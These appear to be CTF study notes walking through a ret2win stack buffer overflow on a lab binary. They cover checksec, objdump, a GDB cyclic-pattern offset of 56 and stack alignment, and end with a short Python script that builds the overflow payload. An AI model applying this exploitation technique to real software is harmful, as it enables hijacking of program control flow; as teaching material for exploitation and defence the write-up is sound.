Comprehensive Notes — Ret2Win Stack Buffer Overflow Challenge
Overview

In this challenge, we exploited a vulnerable 64-bit Linux binary by abusing a stack buffer overflow vulnerability to redirect program execution into a hidden function called win().

This is one of the foundational exploitation techniques in:

binary exploitation
reverse engineering
exploit development
capture-the-flag (CTF) competitions
offensive security research
vulnerability assessment

The challenge simulated a realistic software security issue caused by unsafe memory handling in native applications written in languages like:

C
C++
Rust (unsafe sections)
Assembly-integrated systems
Goal of the Challenge

The binary normally:

asks for user input
prints the input back
exits normally

However:

a hidden function existed inside the binary
the function was never called during normal execution
our goal was to force the program to execute it

This technique is commonly called:

ret2win

because we redirect execution to a hidden win() function.

Vulnerability Type
Stack Buffer Overflow

The vulnerability existed because the program accepted user input without validating its size.

A likely vulnerable implementation:

char name[48];
gets(name);

or:

scanf("%s", name);

The issue:

the program trusts user input completely
input larger than the buffer overwrites adjacent memory
eventually the saved return address (RIP) becomes overwritten
Important Concepts Learned
1. Memory Layout of the Stack

A simplified stack layout looked like:

|--------------------|
| Return Address RIP |
|--------------------|
| Saved Base Pointer |
|--------------------|
| Buffer             |
|--------------------|

When the program read excessive input:

AAAAAAAAAAAAAAAAAAAA...

the data spilled outside the buffer and overwrote:

saved frame pointer
saved return address

This allowed us to control execution flow.

2. What is RIP?

In x86-64 systems:

RIP = Instruction Pointer Register

It stores:

the address of the next instruction to execute

Normally:

RET → return to legitimate caller

After exploitation:

RET → jump to attacker-controlled address

This is the basis of control flow hijacking.

3. Binary Protection Enumeration with checksec

We used:

checksec --file=_vuln

Result:

Partial RELRO
No Canary
NX disabled
No PIE
Understanding Each Protection
Stack Canary — Missing

Canaries detect stack corruption before function return.

Without canaries:

overwriting RIP becomes possible
no integrity checks stop the overflow
PIE — Disabled

PIE randomizes memory addresses.

Without PIE:

function addresses remain constant
addresses like 0x401196 never change

This made exploitation significantly easier.

NX — Disabled

NX prevents execution of code on the stack.

Since NX was disabled:

shellcode execution would also have been possible
however we used ret2win instead
RELRO — Partial

RELRO hardens the Global Offset Table (GOT).

Partial RELRO:

still leaves some relocation structures writable

Not relevant for this specific exploit, but important in advanced exploitation.

4. Static Analysis with objdump

We used:

objdump -d _vuln | grep win

This revealed:

0000000000401196 <win>:

This proved:

the hidden function existed
it had a fixed address
it could potentially be jumped to
5. Finding a ret Gadget

We used:

objdump -d _vuln | grep -m1 ret

Result:

40101a: c3 ret

This single instruction became a:

stack alignment gadget
Why the ret Gadget Was Needed

x86-64 calling conventions require:

16-byte stack alignment

Without alignment:

win() may crash
libc instructions like movaps fail

The extra ret corrected stack alignment before entering win().

6. Dynamic Analysis with GDB

We opened the binary in:

gdb ./_vuln

Then generated a cyclic pattern:

cyclic(200)

Purpose:

determine the exact overflow offset
avoid guessing
7. Cyclic Patterns

Instead of:

AAAAAAAAAAAAAAAA

we used:

aaaabaaacaaadaaa...

This unique pattern allows us to identify:

the exact byte offset that overwrote RIP
8. Crash Analysis

After the crash:

x/1xg $rsp

returned:

0x616161706161616f

This value represented:

overwritten RIP contents

Using:

cyclic_find()

we calculated:

OFFSET = 56

Meaning:

after 56 bytes
RIP becomes controllable
9. Constructing the Exploit

Final payload structure:

[A * 56]
[ret gadget]
[win() address]

Python exploit:

from struct import pack
import sys

offset = 56

ret = 0x40101a
win = 0x401196

payload = b"A" * offset
payload += pack("<Q", ret)
payload += pack("<Q", win)

sys.stdout.buffer.write(payload)
10. Exploitation Flow

Execution became:

vuln()
 ↓
RET
 ↓
0x40101a (ret gadget)
 ↓
0x401196 (win)

This successfully hijacked control flow.

Why the Program Crashed Afterwards

After win() completed:

execution attempted another return
the stack was already corrupted
no valid return chain remained

Thus:

Segmentation fault

AFTER the flag is completely normal.
